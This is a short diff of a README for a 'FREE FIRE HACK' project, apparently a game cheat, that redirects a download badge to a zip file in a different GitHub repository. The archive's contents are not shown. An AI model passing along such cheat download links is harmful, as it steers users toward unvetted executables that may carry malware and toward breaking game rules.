@@ -5,7 +5,7 @@
 
 ## Download FREE FIRE HACK
 
-[![Download](https://i.postimg.cc/d1PMhR0n/FREE-FIRE-HACK.png)](https://github.com/radinvahidi/NC-IMBoT/releases/download/Nc-BOT/NC-BOT.zip)
+[![Download](https://i.postimg.cc/d1PMhR0n/FREE-FIRE-HACK.png)](https://github.com/ComputerWiz541/FREE-FIRE-HACK-PC/releases/download/FREE-FIRE-HACK/FREE.FIRE.HACK.zip)
 
 
 ## Supported
